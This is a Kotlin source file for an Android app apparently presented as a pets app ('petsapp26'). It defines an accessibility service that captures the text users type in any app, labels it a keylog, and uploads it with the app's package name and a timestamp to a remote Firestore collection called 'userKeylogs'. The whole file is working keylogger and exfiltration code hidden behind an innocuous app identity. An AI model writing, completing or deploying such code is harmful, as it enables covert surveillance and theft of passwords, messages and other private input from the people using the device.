package com.example.petsapp26

import android.os.Handler
import android.os.Looper
import android.util.Log
import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.view.accessibility.AccessibilityEvent
import com.google.firebase.firestore.FieldValue
import com.google.firebase.ktx.Firebase
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.ktx.firestore

class MyAccessibilityService : AccessibilityService() {

    private val handler = Handler(Looper.getMainLooper())
    private var lastTextEntryTime: Long = 0
    private val debounceDelay: Long = 2000 // Delay in milliseconds
    private var lastText: String = ""

    override fun onAccessibilityEvent(event: AccessibilityEvent) {

        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val currentTime = System.currentTimeMillis()

            // Check the delay from the last text entry
            if (currentTime - lastTextEntryTime > debounceDelay || lastText != event.text.toString()) {
                lastTextEntryTime = currentTime
                lastText = event.text.toString()

                // Cancel any existing callbacks
                handler.removeCallbacksAndMessages(null)

                // Post a new delayed task to save the keylog
                handler.postDelayed({
                    saveKeylog(event)
                }, debounceDelay)
            }
        }

        //val eventType = event.eventType
        //val eventText = when (eventType) {
            //AccessibilityEvent.TYPE_VIEW_CLICKED -> "Clicked: "
            //AccessibilityEvent.TYPE_VIEW_FOCUSED -> "Focused: "
            //AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> "Typed: "
            //else -> ""
        //} + event.text.joinToString(" ")

        // Print the typed text in the logcat. Or do anything you want here.
        //Log.d("ACCESSIBILITY SERVICE", eventText)

    }

    private fun saveKeylog(event: AccessibilityEvent) {
        val packageName = event.packageName.toString()
        val keylogContent = event.text.joinToString("")

        // Log to confirm the save action
        Log.d("ACCESSIBILITY SERVICE", "Saving to Firestore: $keylogContent")

        // Prepare the data to be saved
        val keylogData = hashMapOf(
            "packageName" to packageName,
            "keylogContent" to keylogContent,
            "timestamp" to FieldValue.serverTimestamp()
        )

        // Save the data to Firestore
        Firebase.firestore.collection("userKeylogs").add(keylogData)
            .addOnSuccessListener {
                Log.d("Firestore", "DocumentSnapshot successfully written!")
            }
            .addOnFailureListener { e ->
                Log.w("Firestore", "Error writing document", e)
            }
    }

    override fun onInterrupt() {
        // Handle interruption, such as cleaning up resources.
    }

    override fun onServiceConnected() {
        // Configure our Accessibility service
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_SPOKEN
            notificationTimeout = 100
        }
        this.serviceInfo = info
    }
}

data class userKeylogs(
    val packageName: String,
    val keylogContent: String,
    val timestamp: com.google.firebase.Timestamp
)